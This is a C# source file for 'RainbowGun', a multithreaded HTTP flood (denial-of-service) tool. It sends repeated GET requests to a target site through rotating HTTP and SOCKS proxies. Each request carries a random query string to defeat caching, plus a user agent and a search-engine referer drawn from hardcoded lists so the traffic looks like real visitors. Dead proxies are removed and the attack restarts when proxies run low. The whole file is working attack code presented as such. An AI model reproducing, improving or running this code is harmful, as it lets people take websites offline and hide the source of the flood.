using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using xNet;
using xNet.Net;
using xNet.Threading;

namespace RainbowGun
{
    public class RainbowGun
    {
        private string target;
        private int threads = -1;

        private string proxies_file;
        private string proxies_type = "http";
        private int proxies_wait_delay = 15000;
        private List<string> proxies;
        private int critical_proxies_count = 10;

        private int delay;
        private bool random_string;
        private bool delete_bad;
        private bool debug;

        private MultiThreading mt;

        private List<string> useragent_list = new List<string>();
        private List<string> referer_list = new List<string>();

        public RainbowGun(string target, string proxies_file, int threads, string proxies_type = "http", int delay = 0, bool random_string = true, bool delete_bad = true)
        {
            this.target = target;
            this.proxies_file = proxies_file;
            this.threads = threads;
            this.delay = delay;
            this.random_string = random_string;
            this.delete_bad = delete_bad;
            if (proxies_type == "http" || proxies_type == "socks4" || proxies_type == "socks4a" ||
                proxies_type == "socks5")
            {
                this.proxies_type = proxies_type;
            }
            SetUserAgentList();
            SetRefererList();

        }

        public void Attack()
        {
            GetProxies();
            if (proxies.Count != 0)
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("\nLoaded {0} proxies!\n", proxies.Count);
                Console.ResetColor();
                mt = new MultiThreading((threads == -1) ? proxies.Count : threads);
                mt.Run(AttackThread);

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("All {0} threads started!", mt.ThreadCount);
                Console.ResetColor();

                while (mt.Working)
                {
                    if (proxies.Count <= critical_proxies_count)
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine("CRITICAL PROXY COUNT! RESTART INITIALIZED!");
                        Console.ResetColor();
                        Stop();  
                        break;
                    }
                }
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("ALL THREADS STOPPED!");
                Console.ResetColor();
                Console.ReadKey();
                Attack();
            }
            else
            {
                Console.WriteLine("No proxies!");
            }
        }

        public void Stop()
        {
            mt.Cancel();
        }

        private void AttackThread()
        {
            string attack_target = null;
            string proxy = null;
            while (mt.Canceling != true)
            {
                if (proxies.Count > 0)
                {
                    try
                    {
                        proxy = proxies[Rand.Next(0, (proxies.Count) - 1)];

                        if (proxy != null)
                        {
                            using (var request = new HttpRequest())
                            {
                                switch (proxies_type)
                                {
                                    case "http":
                                        request.Proxy = HttpProxyClient.Parse(proxy);
                                        break;
                                    case "socks4":
                                        request.Proxy = Socks4ProxyClient.Parse(proxy);
                                        break;
                                    case "socks4a":
                                        request.Proxy = Socks4aProxyClient.Parse(proxy);
                                        break;
                                    case "socks5":
                                        request.Proxy = Socks5ProxyClient.Parse(proxy);
                                        break;
                                    default:
                                        request.Proxy = HttpProxyClient.Parse(proxy);
                                        break;
                                }

                                if (random_string)
                                {
                                    //attack_target = target + "/" + GetRandomString(Rand.Next(0, 16));
                                    attack_target = target + "?" + GetRandomString(Rand.Next(3, 10)) + "=" +
                                                    GetRandomString(Rand.Next(3, 10));
                                }

                                request.Proxy.ConnectTimeout = proxies_wait_delay;
                                request.AddHeader("User-Agent", useragent_list[Rand.Next(0, useragent_list.Count - 1)]);
                                request.AddHeader("Cache-Control", "no-cache");
                                request.AddHeader("Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7");
                                request.AddHeader("Referer",
                                    referer_list[Rand.Next(0, referer_list.Count - 1)] +
                                    GetRandomString(Rand.Next(5, 10)).ToUpper());
                                request.AddHeader("Keep-Alive", Rand.Next(110, 120).ToString());
                                request.KeepAlive = true;

                                Console.WriteLine("{0} - [{1}]", proxy, (int)request.Get(attack_target).StatusCode);

                            }
                        }
                        Thread.Sleep(delay);
                    }
                    catch (ProxyException pex)
                    {
                        Console.WriteLine(pex.StackTrace);
                        Console.WriteLine(pex.Message);
                        if (delete_bad && proxy != null)
                        {
                            proxies.Remove(proxy);
                            Console.ForegroundColor = ConsoleColor.Yellow;
                            Console.WriteLine("Deleted proxy {0}", proxy);
                            Console.WriteLine("Proxies left: {0}",proxies.Count);
                            Console.ResetColor();
                        }
                        return;
                    }
                    catch (HttpException hex)
                    {
                        switch ((int)hex.HttpStatusCode)
                        {
                            case 500:
                                Console.ForegroundColor = ConsoleColor.Red;
                                Console.WriteLine("{0} - [{1}]", proxy, (int)hex.HttpStatusCode);
                                Console.ResetColor();
                                break;
                            case 0:
                                if (delete_bad && proxy != null)
                                {
                                    proxies.Remove(proxy);
                                    Console.ForegroundColor = ConsoleColor.Yellow;
                                    Console.WriteLine("Deleted proxy {0}", proxy);
                                    Console.WriteLine("Proxies left: {0}", proxies.Count);
                                    Console.ResetColor();
                                }
                                return;
                            default:
                                Console.WriteLine("{0} - [{1}]", proxy, (int)hex.HttpStatusCode);
                                break;
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                    }
                }
                else
                {
                    Console.WriteLine("No proxies found! Attack impossible!");
                }
            }
        }

        private void GetProxies()
        {
            Proxy proxy = new Proxy(proxies_file, proxies_type, debug, proxies_wait_delay);
            proxies = proxy.GetGoodProxies();
        }

        #region SetParametres

        public void SetProxiesTimeout(int pdelay)
        {
            proxies_wait_delay = pdelay;
        }

        public void SetDebug(bool debug)
        {
            this.debug = debug;
        }

        public void SetCriticalProxiesCount(int count)
        {
            critical_proxies_count = count < 0 ? 0 : count;
        }

        #endregion

        private string GetRandomString(int size)
        {
            StringBuilder builder = new StringBuilder();
            Random random = new Random();
            char ch;
            for (int i = 0; i < size; i++)
            {
                if (random.Next() % 2 == 0)
                {
                    ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
                    builder.Append(ch);
                }
                else
                {
                    builder.Append(random.Next(0, 9));
                }
            }
            return builder.ToString().ToLower();
        }

        private void SetUserAgentList()
        {
            useragent_list.Add("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3");
            useragent_list.Add("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)");
            useragent_list.Add("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)");
            useragent_list.Add("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1");
            useragent_list.Add("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1");
            useragent_list.Add("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)");
            useragent_list.Add("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)");
            useragent_list.Add("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)");
            useragent_list.Add("Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)");
            useragent_list.Add("Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)");
            useragent_list.Add("Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)");
            useragent_list.Add("Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51");
        }

        private void SetRefererList()
        {
            referer_list.Add("http://www.google.com/?q=");
            referer_list.Add("http://www.usatoday.com/search/results?q=");
            referer_list.Add("http://engadget.search.aol.com/search?q=");
            referer_list.Add("http://go.mail.ru/search?q=");
            referer_list.Add("http://rambler.ru/?query=");
            referer_list.Add("http://yandex.ru/yandsearch?text=");
            referer_list.Add("http://sputnik.ru/search?q=");
        }

        private int GetSymbolCount(string str, char symb)
        {
            return str.Count(ch => ch == symb);
        }
    }
}
